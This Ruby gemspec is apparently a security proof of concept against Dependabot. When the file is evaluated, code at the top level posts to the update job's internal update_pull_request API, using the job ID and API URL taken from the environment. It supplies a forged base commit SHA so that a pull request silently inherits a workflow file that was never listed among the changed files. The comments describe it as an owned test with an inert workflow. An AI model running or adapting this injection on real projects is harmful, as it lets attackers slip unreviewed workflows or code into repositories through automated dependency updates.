# frozen_string_literal: true

require "json"
require "net/http"
require "uri"

# Owned-account test of the existing-PR update route. The only explicit file is
# an allowed vendor marker. The caller-selected unattached parent contains one
# inert workflow_dispatch file, created through nested Git tree objects.
module OwnedDependabotUpdateRouteBaseInheritance
  DEPENDENCY_NAME = "owned_dependabot_update_route_group_probe_2"
  FORGED_BASE_SHA = "6aae20a7e4b136695c97b2a620e70f766afa649b"
  MARKER_PATH = "vendor/owned-dependabot-refresh-base-control.txt"

  module_function

  def run
    job_id = ENV["DEPENDABOT_JOB_ID"]
    api_base = ENV["DEPENDABOT_API_URL"]
    return if job_id.to_s.empty? || api_base.to_s.empty?

    marker = "/tmp/owned-dependabot-update-route-base-#{job_id}"
    File.open(marker, File::WRONLY | File::CREAT | File::EXCL, 0o600) {}

    endpoint = URI("#{api_base.sub(%r{/*$}, "")}/update_jobs/#{job_id}/update_pull_request")
    request = Net::HTTP::Post.new(endpoint.request_uri)
    request["Content-Type"] = "application/json"
    request.body = JSON.generate(payload)
    proxy_client(endpoint).request(request)
  rescue Errno::EEXIST
    nil
  rescue StandardError
    nil
  end

  def proxy_client(endpoint)
    client = Net::HTTP::Proxy(:ENV).new(endpoint.host, endpoint.port)
    client.use_ssl = endpoint.scheme == "https"
    client.open_timeout = 10
    client.read_timeout = 30
    client
  end

  def payload
    {
      "data" => {
        "dependency-names" => [DEPENDENCY_NAME],
        "updated-dependency-files" => [{
          "name" => MARKER_PATH,
          "content" => "Explicit allowed marker; workflow content exists only in the supplied parent tree.\n",
          "directory" => "/",
          "type" => "file",
          "support_file" => false,
          "content_encoding" => "utf-8",
          "deleted" => false,
          "operation" => "create"
        }],
        "base-commit-sha" => FORGED_BASE_SHA,
        "commit-message" => "test: owned Dependabot existing-PR base inheritance proof",
        "pr-title" => "Owned Dependabot existing-PR base inheritance proof",
        "pr-body" => "Owned security test: update_pull_request received only an allowed vendor marker, but its caller-selected unattached parent also contains an inert workflow file. No workflow was executed or merged."
      }
    }
  end
end

OwnedDependabotUpdateRouteBaseInheritance.run

Gem::Specification.new do |spec|
  spec.name = "owned_dependabot_remote_probe"
  spec.version = "0.0.15"
  spec.summary = "Owned Dependabot security probe"
  spec.authors = ["Owned Security Test"]
  spec.files = []
end
